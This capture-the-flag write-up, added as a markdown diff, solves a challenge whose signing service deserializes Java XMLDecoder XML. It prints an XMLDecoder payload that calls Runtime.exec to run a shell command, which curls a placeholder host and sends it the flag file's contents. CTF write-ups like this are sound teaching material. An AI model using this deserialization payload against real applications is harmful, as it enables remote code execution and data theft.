@@ -1,0 +1,67 @@
+## Web 100 - SignServer
+
+There was a web page that let us upload any document, signs it and returns
+serialized java object in the xml format. Then you can submit back that xml to verify.
+
+Sample signed document looks like below
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
+ <object class="models.CTFSignature" id="CTFSignature0">
+  <void class="models.CTFSignature" method="getField">
+   <string>hash</string>
+   <void method="set">
+    <object idref="CTFSignature0"/>
+    <string>da39a3ee5e6b4b0d3255bfef95601890afd80709</string>
+   </void>
+  </void>
+  <void class="models.CTFSignature" method="getField">
+   <string>sig</string>
+   <void method="set">
+    <object idref="CTFSignature0"/>
+    <string>12a626d7c85bcc21d9f35302e33914104d8329a0</string>
+   </void>
+  </void>
+ </object>
+</java>
+```
+
+I thought uploading custom serialized code would do the job.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
+ <object class="models.CTFSignature" id="CTFSignature0">
+  <void class="models.CTFSignature" method="getField">
+   <string>hash</string>
+   <void method="set">
+    <object idref="CTFSignature0"/>
+    <string>da39a3ee5e6b4b0d3255bfef95601890afd80709</string>
+   </void>
+  </void>
+  <void class="models.CTFSignature" method="getField">
+   <string>sig</string>
+   <void method="set">
+    <object idref="CTFSignature0"/>
+    <string>12a626d7c85bcc21d9f35302e33914104d8329a0</string>
+   </void>
+  </void>
+ </object>
+ <object class="java.lang.Runtime" method="getRuntime">
+     <void method="exec">
+         <array class="java.lang.String" length="3">
+             <void index="0">
+              <string>/bin/sh</string>
+             </void>
+             <void index="1">
+              <string>-c</string>
+             </void>
+             <void index="2">
+              <string>curl <ip>:port/c.php?c=$(cat flag)</string>
+             </void>
+         </array>
+     </void>
+ </object>
+</java>
+
+```
